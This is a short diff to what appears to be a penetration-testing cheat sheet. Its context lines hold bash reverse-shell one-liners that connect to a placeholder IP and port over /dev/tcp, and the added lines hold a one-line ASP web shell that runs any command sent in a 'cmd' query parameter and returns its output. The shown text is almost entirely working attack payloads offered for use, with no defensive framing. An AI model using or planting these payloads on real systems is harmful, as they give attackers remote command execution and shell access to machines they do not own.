@@ -336,6 +336,11 @@ bash -c "bash -i >%26 /dev/tcp/IP/port 0>%261"
 bash -c "bash -i >& /dev/tcp/IP/port 0>&1"
 
 ```
+***ASP*** simple shell
+
+```
+<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
+```
 
 ### Python Fully TTY
 
